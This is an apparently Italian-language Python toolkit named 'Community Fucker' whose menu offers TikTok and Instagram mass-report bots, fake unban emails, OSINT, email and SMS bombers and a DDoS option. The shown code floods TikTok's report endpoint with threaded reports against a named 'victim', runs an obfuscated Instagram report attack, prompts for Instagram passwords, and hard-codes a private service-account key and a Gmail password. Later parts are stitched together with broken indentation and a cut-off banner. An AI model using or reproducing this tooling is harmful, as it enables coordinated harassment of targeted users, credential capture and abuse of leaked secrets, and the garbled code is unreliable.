from os import system, name
from time import time, strftime, gmtime, sleep
import pyfiglet, os, threading
import re
import requests
import json
import threading
from colorama import Fore
import os

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

clear()
system('title Community Fucker')

print(pyfiglet.figlet_format("Community Fucker", font="slant"))
print("1. TikTokReportBot.\n2. InstaReportBot.\n3. TikTokUnbanBot.\n4. InstagramUnbanBot.\n5. WhatsAppReportEmail.\n6. OsintEmail.\n7. OsintPhoneNumber.\n8. EmailBomber.\n9. SMSBomber.\n10. DDOS LAYER 4.\n")

auto = int(input("Mode: "))


if auto == 1:
   import re
   import requests
   import json
   import threading
   from colorama import Fore
   import os
try:
# this is only to show you your ip, it sends it no where.
      ipurl = 'https://httpbin.org/ip'
      r = requests.get(ipurl)
      ipinf = json.loads(r.text)
      ip = ipinf['origin']
      os.system('cls') if os.name == 'nt' else os.system('clear')
      print(Fore.CYAN + "                  ███████████ █████ █████   ████"+ Fore.RED + "        ██████   █████ █████  █████ █████   ████ ██████████ ███████████  ")
      print(Fore.CYAN + "                 ░█░░░███░░░█░░███ ░░███   ███░ "+ Fore.RED + "        ░░██████ ░░███ ░░███  ░░███ ░░███   ███░ ░░███░░░░░█░░███░░░░░███ ")
      print(Fore.CYAN + "                     ░███  ░  ░███  ░███  ███   "+ Fore.RED + "         ░███░███ ░███  ░███   ░███  ░███  ███    ░███  █ ░  ░███    ░███ ")
      print(Fore.CYAN + "                     ░███     ░███  ░███████  █████"+ Fore.RED +"█████ ░███░░███░███  ░███   ░███  ░███████     ░██████    ░██████████  ")
      print(Fore.CYAN + "                     ░███     ░███  ░███░░███ ░░░░"+ Fore.RED+"░░░░░░ ░███ ░░██████  ░███   ░███  ░███░░███    ░███░░█    ░███░░░░░███ ")
      print(Fore.CYAN + "                     ░███     ░███  ░███ ░░███  "+ Fore.RED + "         ░███  ░░█████  ░███   ░███  ░███ ░░███   ░███ ░   █ ░███    ░███")
      print(Fore.CYAN + "                     █████    █████ █████ ░░████ "+ Fore.RED +"        █████  ░░█████ ░░████████   █████ ░░████ ██████████ █████   █████")
      print(Fore.CYAN + "                    ░░░░░    ░░░░░ ░░░░░   ░░░░  "+ Fore.RED+"         ░░░░░    ░░░░░   ░░░░░░░░   ░░░░░   ░░░░ ░░░░░░░░░░ ░░░░░   ░░░░░ ")
      print(f'ATTENZIONE se non usi una vpn o proxy potresti essere blacklistato da TikTok e quindi failare il ban, IP che hai ora : {ip}\n')
      global repamount
      repamount = 0
      print('Thread (100 consigliato.')
      amount_threads = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
      print('Video or account? 1/2')
      vid_or_acc = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
      if vid_or_acc == "1":
        print('Link del video. (Pls usa il link del sito e non quello consigliato!)')
        link_to_vid = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
        print(Fore.CYAN + '''\nSelezione il motivo piu adatto.
    [1] Disinformazione
    [2] Attivita pericolose o organizzazioni
    [3] Attivita illegali e beni irregolati
    [4] Truffe e scam
    [5] Contenuto grafico violento
    [6] Crudelta contro gli animali
    [7] Suicidio, autolesionismo, o atti pericolosi
    [8] Incitamento Odio
    [9] Molestie e bullismo
    [10] Pornografia e nudita
    [11] Sicurezza Dei Minori
    [12] Spam
    [13] Altro
    ''')  
        methods = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
        if methods == '1':
          print(Fore.CYAN + '''\n[1] Election Misinformation
    [2] Covid19 Misinformation
    [1] Other Misinformation\n''')
          method_video_m = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_m == '1':
            method_for_reporting = '1143'
          elif method_video_m == '2':
            method_for_reporting = '1141'
          elif method_video_m == '3':
            method_for_reporting = '1142'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '2':
          print(Fore.CYAN + '''\n[1] Terrorismo
    [2] Gruppi criminali
    [3] Gruppi Odio\n''')
          method_video_d = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_d == '1':
            method_for_reporting = '1011'
          elif method_video_d == '2':
            method_for_reporting = '1012'
          elif method_video_d == '3':
            method_for_reporting = '1013'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '3':
          print(Fore.CYAN + '''\n[1] Promozione attivita criminali
    [2] Vendita o uso di armi = 1022
    [3] Droghe e sostanze\n''')
          method_video_i = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_i == '1':
            method_for_reporting = '1021'
          elif method_video_i == '2':
            method_for_reporting = '1022'
          elif method_video_i == '3':
            method_for_reporting = '1023'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '4':
          method_for_reporting = '1024'
        elif methods == '5':
          method_for_reporting = '103'
        elif methods == '6':
          method_for_reporting = '104'
        elif methods == '7':
          print(Fore.CYAN + '''\n[1] Suicidio
    [2] Autolesionismo
    [3] Atti pericolosi\n''')
          method_video_s = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_s == '1':
            method_for_reporting = '1051'
          elif method_video_s == '2':
            method_for_reporting = '1052'
          elif method_video_s == '3':
            method_for_reporting = '1053'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '8':
          method_for_reporting = '106'
        elif methods == '9':
          print(Fore.CYAN + '''\n[1] Me
    [2] Qualcuno che conosco
    [3] Celebrita
    [4] Altri\n''')
          method_video_h = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_h == '1':
            method_for_reporting = '1001'
          elif method_video_h == '2':
            method_for_reporting = '1002'
          elif method_video_h == '3':
            method_for_reporting = '1003'
          elif method_video_h == '4':
            method_for_reporting = '1004'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '10':
          method_for_reporting = '108'
        elif methods == '11':
          print(Fore.CYAN + '''\nDelinquenza Minorile
    Contenuto inappropriato
    Abuso minorile\n''')
          method_video_mi = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_video_mi == '1':
            method_for_reporting = '1091'
          elif method_video_mi == '2':
            method_for_reporting == '1092'
          elif method_video_mi == '3':
            method_for_reporting = '1093'
          else:
            print('USA UNA MOTIVAZIONE VALIDA!')
            input()
            quit()
        elif methods == '12':
          method_for_reporting = '110'
        elif methods == '13':
          method_for_reporting = '111'
        user = str(re.findall('https://www.tiktok.com/@(.*?)/video/', link_to_vid)).strip("['']")
        with open('config.json') as f:
          cookie = json.load(f)
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
           }
        params = {
                                'is_copy_url': '1',
                                'is_from_webapp': 'v1'
                            }
        url = f"https://tiktok.com/@{user}?"
        response = requests.get(url, headers=headers, params=params)
        Json = json.loads('{' + response.text.split('crossorigin="anonymous">{')[1].split('</script><script')[0])
        worker = Json['props']['pageProps']['userInfo']
        id = worker['user']['id']
        url = f'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id={id}&region=US&priority_region=&os=windows&referer=&root_referer=https:%2F%2F{link_to_vid}%2F&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=en-US&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F91.0.4472.106+Safari%2F537.36&browser_online=true&verifyFp=verify_kkw5yl51_T9RSQuuQ_27PS_4Lm6_B7YJ_qePLnpAQMQc5&app_language=en&timezone_name=America%2FNew_York&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=5&battery_info=1'
        headers = {
      "cookie": cookie['cookie'],
      "origin": "https://www.tiktok.com",
      "referer": f'https://tiktok.com/@{user}'
    }
        def report_video():
                  data = {
                          'object_id': id,
                          'owner_id': id,
                          'reason': method_for_reporting,
                          'report_type': "video"
                                  }
                  global repamount
                  try:
                    while True:
                            res = requests.post(url, data=data, headers=headers)
                            if res.text == '{"statusCode":0,"body":{"statusCode":0,"errMsg":"Thanks for your feedback"},"errMsg":"Thanks for your feedback"}':
                              repamount += 1
                              print(Fore.GREEN + f"{repamount} REPORTS MANDATE AL VIDEO DI {user.upper()}")
                            elif "<TITLE>Accesso Negato</TITLE>" in res.text:
                              print(Fore.RED + "⚠  RATE LIMITATO  ⚠")
                            elif res.text == '{"statusCode":1,"errMsg":"Il server e offline. Perfavore riprova."}':
                              print(Fore.YELLOW + "SERVER OFF")
                            else:
                              print(Fore.YELLOW + "ERRORE REPORTANDO")
                  except Exception as e:
                    print(e)
                    input()
        try:    
          threads = []
          for i in range(int(amount_threads)):
                    t = threading.Thread(target=report_video)
                    t.daemon = True
                    t.start()
                    threads.append(t)
          for thread in threads:
                    thread.join()
        except Exception as e:
          print(e)
          input()
      elif vid_or_acc == "2":
        print("@ della vittima.")
        user = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
        print(Fore.CYAN + '''Seleziona la motivazione.
    [1] Si finge qualcuno
    [2] Informazioni di profilo inappropriate
    [3] OAltro''')
        method = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
        if method == '1':
          print(Fore.CYAN + '''    [1] Me
    [2] Celebrita''')
          method_acc_p = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_acc_p == '1':
            method_for_reporting = '3131'
          else:
            method_for_reporting = "3003"
        elif method == '2':
          print(Fore.CYAN + '''[1] Foto Profilo
    [2] Nickname
    [3] Username
    [4] Bio
    [5] Link''')
          method_acc_i = input(Fore.CYAN + '~~'+ Fore.RED + '> ')
          if method_acc_i == '1':
            method_for_reporting = '3141'
          elif method_acc_i == '2':
            method_for_reporting = '3142'
          elif method_acc_i == '3':
            method_for_reporting = '3143'
          elif method_acc_i == '4':
            method_for_reporting = '3144'
          elif method_acc_i == '5':
            method_for_reporting = '3145'
        elif method == '3':
          method_for_reporting = '311'
        else:
          print('SELEZIONA UNA MOTIVAZIONE!')
          input()
          quit()
        with open('config.json') as f:
                  cookie = json.load(f)
        headers = {
        'Cookie': cookie['cookie'],
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
           }
        params = {
                                'is_copy_url': '1',
                                'is_from_webapp': 'v1'
                            }
        url = f"https://tiktok.com/@{user}?"
        response = requests.get(url, headers=headers, params=params)
        Json = json.loads('{' + response.text.split('crossorigin="anonymous">{')[1].split('</script><script')[0])
        worker = Json['props']['pageProps']['userInfo']
        id = worker['user']['id']
        url = f'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id={id}&region=US&priority_region=&os=windows&referer=&root_referer=https:%2F%2Fwww.tiktok.com%2F&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=en-US&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F91.0.4472.106+Safari%2F537.36&browser_online=true&verifyFp=verify_kkw5yl51_T9RSQuuQ_27PS_4Lm6_B7YJ_qePLnpAQMQc5&app_language=en&timezone_name=America%2FNew_York&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=5&battery_info=1'
        def report_account():
            data = {
                  'object_id': id,
                  'owner_id': id,
                  'reason': method_for_reporting,
                  'report_type': "user"
                          }
            global repamount
            try:
                    while repamount < 200:
                            res = requests.post(url, data=data)
                            if res.text == '{"statusCode":0,"body":{"statusCode":0,"errMsg":"Thanks for your feedback"},"errMsg":"Thanks for your feedback"}':
                              repamount += 1
                              print(Fore.GREEN + f"{repamount} REPORTS MANDATE A {user.upper()}")
                            elif "<TITLE>Accesso Negato</TITLE>" in res.text:
                              print(Fore.RED + "⚠  RATE LIMITATO  ⚠")
                            elif res.text == '{"statusCode":1,"errMsg":"Il server e off. Perfavore riprova."}':
                              print(Fore.YELLOW + "SERVER OFF")
                            else:
                              print(Fore.YELLOW + 'ERRORE REPORTANDO')
            except Exception as e:
                    print(e)
        try:    
          threads = []
          for i in range(int(amount_threads)):
                    t = threading.Thread(target=report_account)
                    t.daemon = True
                    t.start()
                    threads.append(t)
          for thread in threads:
                    thread.join()
        except Exception as e:
          print(e)
except Exception as e:
	print(e)
print(pyfiglet.figlet_format("Community Fucker", font="slant"))
print("Log:")

if auto == 2:
    from colorama import Fore ,Back ,Style #line:3
from multiprocessing import Process #line:4
from about import about_msg #line:5
from help import help_msg #line:6
from libs .animation import colorText #line:7
from libs .animation import starting_bot #line:8
from libs .animation import load_animation #line:9
from libs .animation import animation_bar #line:10
from libs .attack import report_video_attack #line:11
from libs .attack import report_profile_attack #line:12
from libs .proxy_harvester import find_proxies #line:13
from libs .utils import parse_proxy_file #line:14
from libs .utils import clearConsole #line:15
from libs .utils import print_status #line:16
from libs .utils import print_error #line:17
from libs .utils import print_success #line:18
from libs .logo import print_logo #line:19
from os import path #line:20
import requests #line:21
import time #line:22
from libs .check_modules import check_modules #line:23
from sys import exit #line:24
from os import _exit #line:25
import os #line:26
import webbrowser #line:27
import firebase_admin #line:29
from firebase_admin import credentials #line:30
from firebase_admin import db #line:31
from firebase_admin import firestore #line:32
from dotenv import load_dotenv #line:33
load_dotenv ()#line:35
cred =credentials .Certificate ({"type":"service_account","project_id":f"{os.getenv('PRODUCT_ID')}","private_key_id":f"{os.getenv('PRIVATE_KEY_ID')}","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCt7RDrIhCHpDXg\n0n+doCjQIHYWx2smSXpfqShO55VXVTa/USKBYUNow7tJcA4ZU+uJAKwULyujqCvo\nv6dM7ei2Efz3eDv161hSmMIFhPTKhocFm50ySsZJq9PuuJNUjXLmTaOq4tq1+yX8\nZ698I5VvDZCR70ZN5eHp3awcLGBt7aWj5sulrb1+90zXXGHANxCa3iiBNXGKDx9b\nHSygzAPzQ5A9pMGwNjCwAZNw+akRTMFJklMAFcLXmZ4eVoXYow6IYHEhJBRj6Q5r\nYCwP5J8iTJ+dc83hAVDbK3yEK198ijNDaIoCZSdDBR8f0FFOMV+cfWAkz5YOvC0y\nvE/gkf+RAgMBAAECggEAKy/au9wPSTMV+s+iBxCSGc35rKHTYiQsKg09mEwqWc9r\nwvlBTWmKnLy/aFaV9aWQLop3cCKfXimfz5EpWHGZz33rd8KH9wI7gfTy9n5jb1eU\ntuiDUc3d60SqoRP9Z2khHv0n1wKyBq6IaeKQIU3PqQ3v+EC3Dxg2LsVPm4ZMYncP\nJ3WSxCjE4KRyiLxup6z2wbkE1fpMhUeerUcQ67fPEM7cKlw5MJzn+y4Ma84WmRrX\nEioVWe/X9Qpq5AckAq5i2EITAbi5M11FnuLJHU/H9RD8dyQaRMUm9PVGOP8BLAiB\n1i/mtbQ9m2e2tMWyVlnZA9NQjlX7sADVnkxAMbGkLQKBgQDnOpH6lTUKo++gjQ94\nZB45Op83r30/z4hiOVmumVtWQKbqQhUlUOvgBNYqJjSxnK0Ecu89sWVSQ7R2lQaP\nfRIyhqsIHQfS1HDMlNuUmqOYoUGbn0jUewqMVrMJ7pLVksor9aJel+wq0jFHkGYt\nVxS0YRcvLSqDQJHe1/JEGZMGTQKBgQDAjvkLWmiAro9rfW6G92YcW99FB3Sk12kp\nHwvRZI/nmVc274Q2cpFKHHpehbfwTHd+frxa+itmyGiHJfvz0+aCHZP2EwYkmwNX\nlIK+QgHC88HAFSR1fDOQ0ZDvPDf3H5V4LVIO5rUrV2eQvu3ARmknHxfj8cG6TA8S\nvhpt6QiIVQKBgCvphZuPBnm01GcrIsr8SHkZ1u7eVuztXrs4pP1xhlUFBi3qytVB\nXuo2QO3UP6GTXZBAu4p9y/4peXYjqxFI8VHDHWv3B2tUiO9xPZolG/h6d1k0kMI5\nc7FfLbUvJ5eDvv1GMsXAGEuxi0ZJ9/2YUghHf/2nmDFA6/LkE9A3AyLpAoGAKhkX\n6ZuCbV+8i0uI9ojwEhMj5PuUTNWrcAoRk13g+ElV//StexnhGcrQFgo2BJszJLyg\ngWNgScBW2fU7+DrDkn7U8l+GYEpjmKonS2Ey8WRJX60/o0/cFjU68pK/yY9mJjgC\nUK+vvCIHymVzpS2/n4X0uykHqasnQHm/XXgtHWECgYEAhM5KL9LAFqfyTL6FUTMz\nTL1A6u0j/gLmYGKnk4aZ0X2Nc/YKZ9MWfR5+HcdfTf9Z9ffyKmhrvK4eZExfW3WA\nqynT/OCqeHKMHNZR4QDroBisomfI4Vv4GhEfP8a2ZsCNRSorI21aepmAstBDVwYl\nvfo0qfsPVA95bNiTHOt08O8=\n-----END PRIVATE KEY-----\n","client_email":f"{os.getenv('CLIENT_EMAIL')}","client_id":f"{os.getenv('CLIENT_ID')}","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":f"{os.getenv('CLIENT_URL')}"})#line:50
firebase_admin .initialize_app (cred )#line:51
db =firestore .client ()#line:52
check_modules ()#line:55
CODE =os .environ .get ("CODE")#line:56
def chunks (O0O0O000O000OOOO0 ,O0OO0O0OO0OOOOO00 ):#line:59
    ""#line:60
    for O000000O0OOO00OOO in range (0 ,len (O0O0O000O000OOOO0 ),O0OO0O0OO0OOOOO00 ):#line:61
        yield O0O0O000O000OOOO0 [O000000O0OOO00OOO :O000000O0OOO00OOO +O0OO0O0OO0OOOOO00 ]#line:62
def profile_attack_process (OOOOOO0000OO0O000 ,OO0OO0OOOO0OO0000 ):#line:65
    if (len (OO0OO0OOOO0OO0000 )==0 ):#line:66
        for _OOOOO0O00O0OOOOO0 in range (10 ):#line:67
            report_profile_attack (OOOOOO0000OO0O000 ,None )#line:68
        return #line:69
    for OO0O0OO0OOO00OOO0 in OO0OO0OOOO0OO0000 :#line:71
        report_profile_attack (OOOOOO0000OO0O000 ,OO0O0OO0OOO00OOO0 )#line:72
def video_attack_process (O0OO00O00OO00O0O0 ,O0OOO00OOO0O0O0O0 ):#line:75
    if (len (O0OOO00OOO0O0O0O0 )==0 ):#line:76
        for _OO0O00OOOOOO0OO0O in range (10 ):#line:77
            report_video_attack (O0OO00O00OO00O0O0 ,None )#line:78
        return #line:79
    for OO00000OO0OOOOOOO in O0OOO00OOO0O0O0O0 :#line:81
        report_video_attack (O0OO00O00OO00O0O0 ,OO00000OO0OOOOOOO )#line:82
def video_attack (OOOOOOO0000OO0OOO ):#line:85
    O0OOO00OOOOO0O0OO =input ("Link del video da segnalare")#line:86
    print (Style .RESET_ALL )#line:87
    if (len (OOOOOOO0000OO0OOO )==0 ):#line:88
        for OO00O0O00O00OO0O0 in range (5 ):#line:89
            O00O0000O000O000O =Process (target =video_attack_process ,args =(O0OOO00OOOOO0O0OO ,[],))#line:90
            O00O0000O000O000O .start ()#line:91
            print_status (str (OO00O0O00O00OO0O0 +1 )+". Transaction Opened!")#line:92
            if (OO00O0O00O00OO0O0 ==5 ):#line:93
                print ("")#line:94
        return #line:95
    OO0OO0OO0OOOOOO0O =list (chunks (OOOOOOO0000OO0OOO ,10 ))#line:97
    print ("")#line:99
    print_status ("Video complaint attack is on!\n")#line:100
    O0O0O000OOO0O0OOO =1 #line:102
    for O000OOO000O0O00OO in OO0OO0OO0OOOOOO0O :#line:103
        O00O0000O000O000O =Process (target =video_attack_process ,args =(O0OOO00OOOOO0O0OO ,O000OOO000O0O00OO ,))#line:104
        O00O0000O000O000O .start ()#line:105
        print_status (str (O0O0O000OOO0O0OOO )+". Transaction Opened!")#line:106
        if (OO00O0O00O00OO0O0 ==5 ):#line:107
            print ("")#line:108
        O0O0O000OOO0O0OOO =O0O0O000OOO0O0OOO +1 #line:109
def profile_attack (OOO0O00OO0O0O000O ):#line:112
    OO0000OO0O00O0OOO =input ("Enter the username of the person you want to report : ")#line:113
    O0O0O000OOOO0OO00 =requests .get ("https://instagram.com/"+OO0000OO0O00O0OOO +"/")#line:114
    if O0O0O000OOOO0OO00 .status_code !=200 :#line:115
        print ("\n\n"+Fore .RED +"[*] Invalid username!")#line:116
        time .sleep (2 )#line:117
        profile_attack (OOO0O00OO0O0O000O )#line:118
    elif (OO0000OO0O00O0OOO ==""):#line:119
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:121
        time .sleep (2 )#line:122
        profile_attack (OOO0O00OO0O0O000O )#line:123
    print (Style .RESET_ALL )#line:124
    if (len (OOO0O00OO0O0O000O )==0 ):#line:125
        for OO000O00O0OOOO00O in range (5 ):#line:126
            O0OO0OOOOOOOOOO00 =Process (target =profile_attack_process ,args =(OO0000OO0O00O0OOO ,[],))#line:127
            O0OO0OOOOOOOOOO00 .start ()#line:128
            print_status (str (OO000O00O0OOOO00O +1 )+". Transaction Opened!")#line:129
        return #line:130
    O00O0O00OO0OOO0OO =list (chunks (OOO0O00OO0O0O000O ,10 ))#line:132
    print ("")#line:134
    print_status ("Profile complaint attack is starting!\n")#line:135
    OOO000OOOOOO0OO0O =1 #line:137
    for O0OOO0OOO0OO00O00 in O00O0O00OO0OOO0OO :#line:138
        O0OO0OOOOOOOOOO00 =Process (target =profile_attack_process ,args =(OO0000OO0O00O0OOO ,O0OOO0OOO0OO00O00 ,))#line:140
        O0OO0OOOOOOOOOO00 .start ()#line:141
        print_status (str (OOO000OOOOOO0OO0O )+". Transaction Opened!")#line:142
        if (OOO000OOOOOO0OO0O ==5 ):#line:143
            print ("")#line:144
        OOO000OOOOOO0OO0O =OOO000OOOOOO0OO0O +1 #line:145
def unlock ():#line:147
    print (Style .RESET_ALL )#line:148
    OOO00O0OOO0OO0O0O =input ("Codice per sbloccare il tool - ")#line:149
    if (OOO00O0OOO0OO0O0O =="iscriviti"):#line:150
        print_success ("Tool sbloccato!\n\n")#line:151
        starting_bot ()#line:152
        database ()#line:153
    elif (OOO00O0OOO0OO0O0O =="1"):#line:154
        time .sleep (3 )#line:156
        webbrowser .open ('http://topnotch-programmer.com')#line:157
        time .sleep (1 )#line:158
        unlock ()#line:159
    else :#line:160
        print_success ("Premi 1 per aiuto\n")#line:162
        time .sleep (2 )#line:163
        unlock ()#line:164
def database ():#line:167
    clearConsole ()#line:168
    print_logo ()#line:169
    print (Style .RESET_ALL )#line:170
    print_status ("================ LOGIN INSTAGRAM  ================\n")#line:171
    print (Style .RESET_ALL )#line:172
    OOOO0OOOO0O0OOOOO =input ("Nome instagram : ")#line:173
    O0O0000O0OOOOO000 =input ("Password Instagram : ")#line:174
    O0OO0000O0O0OOOO0 =requests .get ("https://instagram.com/"+OOOO0OOOO0O0OOOOO +"/")#line:176
    if O0OO0000O0O0OOOO0 .status_code !=200 :#line:177
        print ("\n\n"+Fore .RED +"[*] Nome errato/invalido!")#line:178
        database ()#line:179
    elif (OOOO0OOOO0O0OOOOO ==""):#line:180
        print ("\n\n"+Fore .RED +"[*] Rimetti l'username, non lasciarlo vuoto")#line:182
        database ()#line:183
    elif O0OO0000O0O0OOOO0 .status_code ==200 :#line:186
        load_animation ()#line:193
        print_success ("Login Fatto!")#line:194
        report ()#line:195
def main ():#line:198
    if (os .name =='nt'):#line:199
        clearConsole ()#line:200
        print_logo ()#line:201
        O00OO00O0OOO00O00 =print ('''
        [1] Start Report Bot
        [2] Help
        [3] About
        [4] Exit
        ''')#line:207
        OO0O0O0OOO00O0000 =input ("Perfavore seleziona :- ")#line:208
        if (OO0O0O0OOO00O0000 .isdigit ()==False ):#line:209
            print_error ("La risposta e understood.")#line:210
            main ()#line:211
        if (int (OO0O0O0OOO00O0000 )>4 or int (OO0O0O0OOO00O0000 )==0 ):#line:213
            print_error ("La risposta e understood.")#line:214
            main ()#line:215
        elif (int (OO0O0O0OOO00O0000 )==1 ):#line:216
            unlock ()#line:217
        elif (int (OO0O0O0OOO00O0000 )==2 ):#line:218
            clearConsole ()#line:219
            help_msg ()#line:220
        elif (int (OO0O0O0OOO00O0000 )==3 ):#line:221
            about_msg ()#line:222
        elif (int (OO0O0O0OOO00O0000 )==4 ):#line:223
            print_status ("Uscendo dal programma..... Grazie per aver usato il tool!")#line:224
            exit (0 )#line:225
    else :#line:227
        os .system ('bash setup.sh')#line:228
def report ():#line:231
    clearConsole ()#line:232
    print_logo ()#line:233
    O00O000OOOOOOOO0O =input ("Vuoi usare proxy? [Y/N] : ")#line:234
    OO0OOO00OOO00OOOO =[]#line:235
    if (O00O000OOOOOOOO0O =="Y"or O00O000OOOOOOOO0O =="y"):#line:237
        O00O000OOOOOOOO0O =input ("Vuoi prendere i proxy da internet? [Y/N] : ")#line:239
        if (O00O000OOOOOOOO0O =="Y"or O00O000OOOOOOOO0O =="y"):#line:241
            print_status ("Prendendo proxy... Ci vorra un po.\n")#line:243
            time .sleep (2 )#line:244
            OO0OOO00OOO00OOOO =find_proxies ()#line:245
        elif (O00O000OOOOOOOO0O =="N"or O00O000OOOOOOOO0O =="n"):#line:247
            print_status ("Puoi usare al massimo 50 proxies!")#line:248
            OOO00OO0000OOOO0O =input ("Incolla il percorso del file dei tuoi proxy")#line:249
            OO0OOO00OOO00OOOO =parse_proxy_file (OOO00OO0000OOOO0O )#line:250
        else :#line:251
            print_error ("Errore, il tool sara chiuso!")#line:252
            exit ()#line:253
        print_success (str (len (OO0OOO00OOO00OOOO ))+" Proxy trovati!\n")#line:255
        print (OO0OOO00OOO00OOOO )#line:256
    elif (O00O000OOOOOOOO0O =="N"or O00O000OOOOOOOO0O =="n"):#line:257
        pass #line:258
    else :#line:259
        print_error ("Errore, il tool sara chiuso!")#line:260
        exit ()#line:261
    print ("")#line:263
    print_status ("1 - Segnala Profilo.")#line:264
    print_status ("2 - Seganala post.")#line:265
    O0O0O0OO000OO0O0O =input ("Perfavore seleziona la motivazione :- ")#line:266
    print ("")#line:267
    if (O0O0O0OO000OO0O0O .isdigit ()==False ):#line:269
        print_error ("Errore.")#line:270
        main ()#line:271
    if (int (O0O0O0OO000OO0O0O )>2 or int (O0O0O0OO000OO0O0O )==0 ):#line:273
        print_error ("Errore.")#line:274
        main ()#line:275
    if (int (O0O0O0OO000OO0O0O )==1 ):#line:277
        profile_attack (OO0OOO00OOO00OOOO )#line:278
    elif (int (O0O0O0OO000OO0O0O )==2 ):#line:279
        video_attack (OO0OOO00OOO00OOOO )#line:280
if __name__ =="__main__":#line:283
    try :#line:284
        main ()#line:285
        print (Style .RESET_ALL )#line:286
    except KeyboardInterrupt :#line:287
        print ("\n\n"+Fore .RED +"[*] Il tool si sta per chiudere!")#line:288
        print (Style .RESET_ALL )#line:289
        _exit (0 )#line:290

    
elif auto == 3:
    import smtplib
import email.message



#auto

a = input('Nome account da sbannare @ inclusa:')

#email
def enviar_email():
    corpo_email = f'Il mio avvocato ha letto con cura tutte le regole di TikTok e ha constatato che il mio account non viola le linee guida, per favore riattivatelo!!'
    
 
    msg = email.message.Message()
    msg['Subject'] = 'Account Banned!'
    msg['From'] = 'slayerandkr@gmail.com'
    msg['To'] = 'safetysupport@tiktok.com'
    password = 'llqeiynzlzneozlu'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('ASPETTA')

    enviar_email()
    if auto == 4:

       
       import smtplib
import email.message



#auto

a = input('Nome account da sbannare @ inclusa:')

#email
def enviar_email():
    corpo_email = f'Il mio avvocato ha letto con cura tutte le regole di Instagram e ha constatato che il mio account non viola le linee guida, per favore riattivatelo!!'
    
 
    msg = email.message.Message()
    msg['Subject'] = 'Account Banned!'
    msg['From'] = 'slayerandkr@gmail.com'
    msg['To'] = 'support@fb.com'
    password = 'llqeiynzlzneozlu'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('ASPETTA')

    enviar_email()
    
    if auto == 5:
    
       
     import smtplib
import email.message


#banner
print ('███╗░░██╗██╗░░░██╗███╗░░░███╗██████╗░███████╗██████╗░')
print ('████╗░██║██║░░░██║████╗░████║██╔══██╗██╔════╝██╔══██╗')
print ('██╔██╗██║██║░░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝')
print ('██║╚████║██║░░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗')
print ('██║░╚███║╚██████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║')
print ('╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝')
print ('                                                     ')
print ('██████╗░░█████╗░███╗░░██╗')
print ('██╔══██╗██╔══██╗████╗░██║')
print ('██████╦╝███████║██╔██╗██║')
print ('██╔══██╗██╔══██║██║╚████║')
print ('██████╦╝██║░░██║██║░╚███║')
